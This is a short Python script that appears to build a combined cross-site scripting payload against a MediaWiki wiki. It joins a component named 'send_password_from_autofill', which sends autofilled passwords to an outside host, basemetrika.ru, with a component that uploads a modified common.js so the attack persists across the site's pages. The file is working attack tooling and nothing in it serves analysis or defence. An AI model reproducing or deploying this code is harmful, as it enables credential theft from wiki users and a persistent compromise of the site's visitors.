import sys
sys.path.append("../")
sys.path.append("../../")
from vector import Component
from sources import load_source
import urllib.parse


comp = Component(
    component_id = "combined_xss_1",
    fast_load_part = "",
    jquery_part = (
        Component(
            component_id = "send_password_from_autofill",
            mw_website_prefix = "/wiki/",
            retrieving_url = "//basemetrika.ru/autofill.js?l=&p="
        ) +
        Component(
            component_id = "modify_common_js",
            mw_prefix = "/w",
            urlenc_new_content=urllib.parse.quote(
                load_source("wikireality_common_js_mod.js")
            ),
            negative_pattern="e24",
            urlenc_summary="."
        )
    )
)

if __name__ == "__main__":
    print(comp)